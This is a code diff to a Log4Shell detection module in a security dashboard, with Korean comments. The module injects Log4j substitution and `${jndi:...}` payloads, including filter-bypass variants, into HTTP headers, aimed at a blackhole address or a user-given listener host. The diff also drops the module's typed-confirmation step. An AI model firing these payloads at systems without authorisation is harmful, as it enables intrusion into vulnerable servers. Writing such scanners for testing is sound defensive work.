@@ -6,14 +6,14 @@
   ① 받는 구간  응답이 보낸 헤더 값을 되돌려 주는가(오류 페이지가 User-Agent 를 적는 경우가 흔하다)
   ② 기본       되돌려 줄 때 `${::-표식}` 을 보낸다. 응답에 `표식` 만 오면 **치환이 살아 있다**
                — Log4j 가 값을 해석했다는 뜻이고, 그 자리에 jndi 를 넣을 수 있다 → 취약
-  ③ 심화       응답으로 못 볼 때는 시간으로 본다. 닿지 않는 주소(문서용 대역)로 jndi 를 걸면
-               취약한 서버는 연결을 기다리다 느려진다 → 뚜렷하게 느려지면 잠재
+  ③ 심화       응답으로 못 볼 때는 시간으로 본다. 닿지 않는 주소(문서용 대역)로 jndi 를 **헤더마다**
+               걸면 취약한 서버는 연결을 기다리다 느려지거나 아예 끊긴다 → 끊기면 취약, 느려지면 잠재
+               (로그에 적히는 자리가 주소마다 달라서 헤더를 하나만 보면 놓친다 — 11-20 실측)
   ④ 우회       앞단이 `${jndi:` 글자를 막을 때 지나가는 모양(`${${lower:j}ndi:…}` 등)으로 다시 본다
 
 **바깥으로 연결하게 만드는 점검이다.** 보내는 주소는 문서용으로 예약된 대역(RFC 5737 198.51.100.0/24)
 이라 남의 서비스에 닿지 않는다. 리스너 칸을 적으면 그 주소로도 한 번 보내고, **걸려 왔는지는 리스너에서
 직접 봐야 한다** — 이 모듈은 그것까지 확인하지 못하므로 근거에 '리스너에서 확인하라' 고 적는다.
-확인 칸에 JNDI 를 적어야 돌아간다.
 """
 import re
 import time
@@ -21,6 +21,10 @@ import uuid
 
 from dashboard import core
 from dashboard.core import Check
+
+# 로그에 적히는 자리는 주소마다 다르다 — 하나만 보면 놓친다(11-20 실측: /login 은 User-Agent 로 터지고
+# / 와 /backend/lectures 는 같은 값에 멀쩡하다)
+DEFAULT_HEADERS = "User-Agent,X-Forwarded-For,Referer,X-Api-Version"
 
 META = {
     "id": "jndi_probe",
@@ -36,13 +40,11 @@ META = {
     "attack": [{"tactic": "TA0001", "technique": "T1190", "name": "Exploit Public-Facing Application"},
                {"tactic": "TA0002", "technique": "T1059", "name": "Command and Scripting Interpreter"}],
     "description": "고른 **주소마다** 요청 헤더에 Log4j 치환식을 넣어 ② 응답에 치환 결과가 돌아오는지(살아 있으면 취약), "
-                   "③ 닿지 않는 주소로 jndi 를 걸었을 때 응답이 느려지는지(잠재), ④ 글자를 가린 모양으로도 되는지 봅니다. "
-                   "**바깥으로 연결하게 만드는 점검입니다 — 확인 칸에 JNDI 를 적어야 돌아갑니다.**",
+                   "③ 닿지 않는 주소로 jndi 를 **헤더마다** 걸었을 때 응답이 끊기거나(취약) 느려지는지(잠재), "
+                   "④ 글자를 가린 모양으로도 되는지 봅니다. "
+                   "**서버가 바깥으로 연결을 시도하게 만듭니다** — 보내는 주소는 문서용 대역이라 남의 서비스에 닿지 않습니다.",
     "params": [
-        {"name": "jndi_ack", "need": "required", "label": "실행 확인", "default": "",
-         "help": "서버가 바깥으로 연결을 시도하게 만듭니다. JNDI 를 적어야 실행됩니다."},
-        {"name": "headers", "need": "required", "label": "넣어 볼 헤더(쉼표)",
-         "default": "User-Agent,X-Forwarded-For,Referer,X-Api-Version",
+        {"name": "headers", "need": "required", "label": "넣어 볼 헤더(쉼표)", "default": DEFAULT_HEADERS,
          "help": "Log4Shell 은 애플리케이션이 **로그에 적는** 값에서 터집니다. 헤더가 가장 흔한 자리입니다."},
         {"name": "listener", "need": "optional", "label": "리스너 주소(host:port) — 있으면 거기로도 보냄", "default": "",
          "placeholder": "13.125.54.149:389",
@@ -59,6 +61,8 @@ BLACKHOLE = "198.51.100.1:389"  # RFC 5737 문서용 대역 — 남의 서비스
 SLOW = 3.0                       # 기준보다 이 배 넘게 느려지면 연결을 기다린 것으로 본다
 MIN_GAP = 1.0                    # 그래도 최소 이만큼(초)은 차이 나야 본다
 MAX_HEADERS = 8
+# jndi 를 걸었을 때 응답이 아예 끊기는 일이 있다 — 서버가 연결을 기다리다 우리 쪽 제한 시간을 넘긴 것이다.
+# 11-20 실측에서 이 예외가 실행 전체를 끊었다. 가장 센 신호인데 기록도 못 남기고 죽는 셈이라 여기서 잡는다.
 
 
 def substitution(mark: str):
@@ -77,9 +81,7 @@ def jndi(host: str, mark: str):
 
 
 def run(target, points, params):
-    if (params.get("jndi_ack") or "").strip().upper() != "JNDI":
-        raise ValueError("실행 확인 칸에 JNDI 를 적어야 실행됩니다 (서버가 바깥으로 연결을 시도하게 만듭니다)")
-    names = [h.strip() for h in (params.get("headers") or "User-Agent").split(",") if h.strip()][:MAX_HEADERS]
+    names = [h.strip() for h in (params.get("headers") or DEFAULT_HEADERS).split(",") if h.strip()][:MAX_HEADERS]
     listener = (params.get("listener") or "").strip()
     out = []
     for p in points:
@@ -90,25 +92,43 @@ def run(target, points, params):
             lines.append(f"{STAGE[stage]} {text}")
 
         def send(name, value):
+            """(응답, 걸린 초). 응답이 끊기면 응답 자리에 None 을 돌려준다 — 끊긴 것도 신호다."""
             t0 = time.monotonic()
-            r = core.fetch(p.url, headers={name: value})
-            return r, time.monotonic() - t0
+            try:
+                return core.fetch(p.url, headers={name: value}), time.monotonic() - t0
+            except OSError:
+                return None, time.monotonic() - t0
 
         # ① 받는 구간 — 응답이 헤더 값을 되돌려 주는가
         echoed, base_ms = [], None
+        dead = []
         for name in names:
             r, took = send(name, mark)
+            if r is None:                       # 표식만 보낸 것도 끊기면 그냥 느린 주소다
+                dead.append(name)
+                continue
             if base_ms is None:
                 base_ms = took
             if mark in r.body:
                 echoed.append(name)
+        if dead:
+            note("screen", "표식만 보낸 요청도 끊긴 헤더: " + ", ".join(dead)
+                 + " — 이 주소는 그냥 느리다(아래 판정에서 뺀다)")
+        if base_ms is None:
+            note("screen", "GET " + p.url + " → 기준 응답을 받지 못함 — 볼 것이 없음(후보 제외)")
+            out.append(Check(point=p, verdict="safe", evidence=chr(10).join(lines)))
+            continue
         note("screen", f"GET {p.url} → 응답에 되돌아온 헤더: {', '.join(echoed) if echoed else '없음'} "
-                       f"· 기준 {int((base_ms or 0) * 1000)}ms")
+                       f"· 기준 {int(base_ms * 1000)}ms")
         keep = r
+        live = [n for n in names if n not in dead]
         # ② 기본 — 되돌려 줄 때는 치환 결과가 바로 보인다
         for name in echoed:
             for value, want, kind in substitution(mark):
                 r, _ = send(name, value)
+                if r is None:
+                    note("basic", f"{name} {kind}: 응답이 끊김 — 치환 결과를 볼 수 없음")
+                    continue
                 hit = want in r.body and value not in r.body
                 note("basic", f"{name} {kind}: {value} → {r.status} · 응답에 '{want}' {'있음' if hit else '없음'}")
                 if hit:
@@ -119,19 +139,38 @@ def run(target, points, params):
                 break
         if not echoed:
             note("basic", "응답이 헤더 값을 되돌려 주지 않아 치환 결과를 눈으로 볼 수 없음 — 시간으로 본다")
-        # ③ 심화 — 닿지 않는 주소로 걸고 느려지는지
-        if verdict == "safe" and base_ms:
-            for value, kind in jndi(BLACKHOLE, mark)[:1]:
-                r, took = send(names[0], value)
-                note("deep", f"{names[0]} 에 jndi({kind}, 닿지 않는 주소): → {r.status} · {int(took * 1000)}ms "
-                             f"(기준 {int(base_ms * 1000)}ms)")
-                if took >= base_ms * SLOW and took - base_ms >= MIN_GAP:
-                    note("deep", "응답이 뚜렷하게 느려짐 — 서버가 연결을 기다린 흔적. 리스너로 확정하세요")
-                    verdict, keep, title = "potential", r, "jndi 조회에 연결을 시도한 흔적(응답 지연)"
+        # ③ 심화 — 닿지 않는 주소로 걸고 느려지는지. 아예 끊기면 그게 가장 센 신호다.
+        # **헤더를 하나만 보면 안 된다.** 11-20 실측: 사용자 웹에서 /login 은 User-Agent 로 25초를
+        # 넘겨 끊기는데 / 와 /backend/lectures 는 같은 값에 멀쩡하다. 로그에 적히는 자리가
+        # 주소마다 다르기 때문이다. 하나만 보고 '안전' 이라 하면 나머지를 놓친다.
+        value, _kind = jndi(BLACKHOLE, mark)[0]
+        for name in (live if verdict == "safe" else []):
+            r, took = send(name, value)
+            if r is None:
+                note("deep", f"{name} 에 jndi(닿지 않는 주소): **응답이 끊김**({int(took * 1000)}ms, "
+                             f"기준 {int(base_ms * 1000)}ms) — 표식만 보낼 때는 멀쩡했다")
+                again, took2 = send(name, value)
+                if again is None:
+                    note("deep", f"한 번 더 보내도 끊김({int(took2 * 1000)}ms) — 서버가 그 값 때문에 바깥으로 "
+                                 "연결을 시도하고 기다린 것이다. 멀쩡한 서버는 이 글자를 해석하지 않는다")
+                    verdict, keep, title = "vuln", None, f"jndi 조회로 응답이 끊김({name}, 바깥 연결 시도)"
+                else:
+                    note("deep", "두 번째는 응답이 옴 — 우연히 끊긴 것일 수 있다. 리스너로 확정하세요")
+                    verdict, keep, title = "potential", again, f"jndi 조회에 한 번 끊김({name}, 확정 안 됨)"
+                break
+            note("deep", f"{name} 에 jndi(닿지 않는 주소): → {r.status} · {int(took * 1000)}ms "
+                         f"(기준 {int(base_ms * 1000)}ms)")
+            if took >= base_ms * SLOW and took - base_ms >= MIN_GAP:
+                note("deep", "응답이 뚜렷하게 느려짐 — 서버가 연결을 기다린 흔적. 리스너로 확정하세요")
+                verdict, keep, title = "potential", r, f"jndi 조회에 연결을 시도한 흔적({name}, 응답 지연)"
+                break
         # ④ 우회 — 글자를 가린 모양으로 다시
         if verdict == "safe" and echoed:
             for value, kind in jndi(BLACKHOLE, mark)[1:]:
                 r, _ = send(echoed[0], value)
+                if r is None:
+                    note("bypass", f"{kind}: 응답이 끊김 — 가린 모양으로도 바깥 연결을 시도한 것으로 보인다")
+                    continue
                 left = value in r.body
                 note("bypass", f"{kind}: → {r.status} · 보낸 글자가 응답에 {'그대로 있음' if left else '없음(해석됐거나 걸러짐)'}")
                 if not left and mark not in r.body:
@@ -139,8 +178,8 @@ def run(target, points, params):
         # 리스너를 적었으면 거기로도 한 번 — 걸려 왔는지는 리스너에서 본다
         if listener:
             for value, kind in jndi(listener, mark):
-                r, _ = send(names[0], value)
-                note("bypass", f"리스너로({kind}): {value} → {r.status}")
+                r, _ = send(live[0] if live else names[0], value)
+                note("bypass", f"리스너로({kind}): {value} → " + (str(r.status) if r else "응답 끊김"))
             note("bypass", f"**리스너({listener})에서 '{mark}' 로 걸려 온 조회가 있는지 직접 보세요** — 이 모듈은 못 봅니다")
             if verdict == "safe":
                 title = "리스너 확인 필요(응답으로는 판정 못 함)"
